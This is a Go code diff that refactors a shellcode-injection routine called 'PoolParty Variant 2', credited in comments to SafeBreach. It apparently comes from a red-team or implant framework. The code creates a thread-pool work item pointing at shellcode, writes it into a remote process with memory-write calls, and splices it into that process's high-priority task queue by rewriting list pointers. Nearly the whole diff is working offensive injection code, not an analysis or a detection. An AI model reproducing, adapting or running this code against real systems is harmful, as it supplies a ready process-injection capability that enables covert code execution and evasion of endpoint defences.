@@ -122,54 +122,60 @@ func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		return output, err
 	}
 
-	// Step 8: Create work item structure via CreateThreadpoolWork (exactly as SafeBreach does)
-	pTpWork, _, err := procCreateThreadpoolWork.Call(
-		shellcodeAddr, // Work callback points to shellcode
-		0,             // Context
-		0,             // Callback environment
-	)
+	// Step 8-11: Build and write work item to target process
+	tpWork, tpWorkAddr, buildOutput, err := poolPartyBuildWorkItem(
+		hProcess, shellcodeAddr, workerFactoryInfo.StartParameter, targetTpPool, targetQueue)
+	output += buildOutput
+	if err != nil {
+		return output, err
+	}
+
+	// Step 12: Insert work item into the target's task queue
+	insertOutput, err := poolPartyInsertWorkItem(hProcess, tpWorkAddr, tpWork, targetTpPool, targetQueue)
+	output += insertOutput
+	if err != nil {
+		return output, err
+	}
+
+	output += "[+] PoolParty Variant 2 injection completed successfully\n"
+	return output, nil
+}
+
+// poolPartyBuildWorkItem creates a work item structure locally, modifies it to target the
+// remote process's TP_POOL, allocates memory in the target, and writes the work item.
+func poolPartyBuildWorkItem(hProcess uintptr, shellcodeAddr, tpPoolAddr uintptr,
+	targetTpPool FULL_TP_POOL, targetQueue TPP_QUEUE) (FULL_TP_WORK, uintptr, string, error) {
+	var output string
+
+	pTpWork, _, err := procCreateThreadpoolWork.Call(shellcodeAddr, 0, 0)
 	if pTpWork == 0 {
-		return output, fmt.Errorf("work item creation failed: %w", err)
+		return FULL_TP_WORK{}, 0, output, fmt.Errorf("work item creation failed: %w", err)
 	}
 	output += "[+] Created work item structure associated with shellcode\n"
 
-	// Step 9: Read and modify the work item structure
 	var tpWork FULL_TP_WORK
-	// Copy the structure from our local process
 	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
 		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
 			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
 	}
-
-	// Close the local work item now that we've copied it
 	procCloseThreadpoolWork.Call(pTpWork)
 
-	// Modify: Point Pool to target's TP_POOL
-	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
+	tpWork.CleanupGroupMember.Pool = tpPoolAddr
 
-	// Modify: Point Flink and Blink to the Queue field address in the target process
-	// targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] is a pointer to TPP_QUEUE in target
-	// We need the address of the Queue field within that TPP_QUEUE
 	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
 	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
 
-	// Read current queue state before modifying
 	var currentQueueFlink uintptr
-	err = injectReadMemoryInto(hProcess, targetQueueListAddr, unsafe.Pointer(&currentQueueFlink), int(unsafe.Sizeof(currentQueueFlink)))
-	if err != nil {
-		return output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %w", err)
+	if err := injectReadMemoryInto(hProcess, targetQueueListAddr, unsafe.Pointer(&currentQueueFlink), int(unsafe.Sizeof(currentQueueFlink))); err != nil {
+		return FULL_TP_WORK{}, 0, output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %w", err)
 	}
-
 	var currentQueueBlink uintptr
-	err = injectReadMemoryInto(hProcess, targetQueueListAddr+8, unsafe.Pointer(&currentQueueBlink), int(unsafe.Sizeof(currentQueueBlink)))
-	if err != nil {
-		return output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %w", err)
+	if err := injectReadMemoryInto(hProcess, targetQueueListAddr+8, unsafe.Pointer(&currentQueueBlink), int(unsafe.Sizeof(currentQueueBlink))); err != nil {
+		return FULL_TP_WORK{}, 0, output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %w", err)
 	}
 
 	output += fmt.Sprintf("[*] Current queue Flink: 0x%X, Blink: 0x%X (queue list addr: 0x%X)\n", currentQueueFlink, currentQueueBlink, targetQueueListAddr)
 
-	// If queue is empty (points to itself), simple circular list
-	// If queue has items, insert at head
 	if currentQueueFlink == targetQueueListAddr {
 		output += "[*] Queue is empty, creating single-element list\n"
 		tpWork.Task.ListEntry.Flink = targetQueueListAddr
@@ -179,78 +185,60 @@ func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		tpWork.Task.ListEntry.Flink = currentQueueFlink
 		tpWork.Task.ListEntry.Blink = targetQueueListAddr
 	}
-
-	// Set WorkState exactly as SafeBreach does
 	tpWork.WorkState.Exchange = 0x2
 	output += "[+] Modified work item structure for insertion\n"
 
-	// Step 10: Allocate memory for work item in target process
 	tpWorkAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWork)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for work item failed: %w", err)
+		return FULL_TP_WORK{}, 0, output, fmt.Errorf("remote allocation for work item failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Allocated work item memory at: 0x%X\n", tpWorkAddr)
 
-	// Step 11: Write work item to target
 	tpWorkBytes := (*[1 << 20]byte)(unsafe.Pointer(&tpWork))[:unsafe.Sizeof(tpWork)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpWorkAddr, tpWorkBytes)
 	if err != nil {
-		return output, fmt.Errorf("memory write for work item failed: %w", err)
+		return FULL_TP_WORK{}, 0, output, fmt.Errorf("memory write for work item failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote work item structure (%d bytes)\n", bytesWritten)
 
-	// Step 12: Insert into queue - write remote work item list entry address to queue's Flink and Blink
-	// Calculate the address of our work item's Task.ListEntry in the target process
-	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))
+	return tpWork, tpWorkAddr, output, nil
+}
 
-	// Recalculate queue addresses (can't use := since variables already declared)
-	targetTaskQueueAddr = targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
-	targetQueueListAddr = targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
+// poolPartyInsertWorkItem links a remote work item into the target's task queue by
+// updating the queue's Flink/Blink pointers and (if non-empty) the old first item's Blink.
+func poolPartyInsertWorkItem(hProcess uintptr, tpWorkAddr uintptr, tpWork FULL_TP_WORK,
+	targetTpPool FULL_TP_POOL, targetQueue TPP_QUEUE) (string, error) {
+	var output string
+
+	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))
+	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
+	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
 
 	output += fmt.Sprintf("[*] Debug: remoteWorkItemTaskListAddr = 0x%X\n", remoteWorkItemTaskListAddr)
 	output += fmt.Sprintf("[*] Debug: targetQueueListAddr (Flink addr) = 0x%X\n", targetQueueListAddr)
 
-	// Update queue's Flink to point to our work item
 	flinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
-	_, err = injectWriteMemory(hProcess, targetQueueListAddr, flinkBytes)
-	if err != nil {
+	if _, err := injectWriteMemory(hProcess, targetQueueListAddr, flinkBytes); err != nil {
 		return output, fmt.Errorf("memory write for queue Flink failed: %w", err)
 	}
 
-	// Update queue's Blink based on whether queue was empty
-	var blinkTarget uintptr
-	if currentQueueFlink == targetQueueListAddr {
-		// Queue was empty, so Blink also points to our work item
-		blinkTarget = remoteWorkItemTaskListAddr
-	} else {
-		// Queue had items, need to update the old first item's Blink to point to us
-		// and queue's Blink stays pointing to the last item
-		// Actually, for simplicity, SafeBreach just sets both to the new item
-		blinkTarget = remoteWorkItemTaskListAddr
-	}
-
+	blinkTarget := remoteWorkItemTaskListAddr
 	blinkBytes := (*[8]byte)(unsafe.Pointer(&blinkTarget))[:]
-	_, err = injectWriteMemory(hProcess, targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))), blinkBytes)
-	if err != nil {
+	if _, err := injectWriteMemory(hProcess, targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))), blinkBytes); err != nil {
 		return output, fmt.Errorf("memory write for queue Blink failed: %w", err)
 	}
 
-	// If there was an existing first item, update its Blink to point to our work item
+	currentQueueFlink := tpWork.Task.ListEntry.Flink
 	if currentQueueFlink != targetQueueListAddr {
-		// Calculate the Blink address of the old first item
-		// currentQueueFlink points to a LIST_ENTRY, Blink is at offset 8
 		oldFirstItemBlinkAddr := currentQueueFlink + 8
 		oldBlinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
-		_, err = injectWriteMemory(hProcess, oldFirstItemBlinkAddr, oldBlinkBytes)
-		if err != nil {
+		if _, err := injectWriteMemory(hProcess, oldFirstItemBlinkAddr, oldBlinkBytes); err != nil {
 			return output, fmt.Errorf("memory write for old first item Blink failed: %w", err)
 		}
 		output += "[*] Updated old first item's Blink pointer\n"
 	}
 
 	output += "[+] Inserted work item into target process thread pool task queue\n"
-	output += "[+] PoolParty Variant 2 injection completed successfully\n"
-
 	return output, nil
 }
 
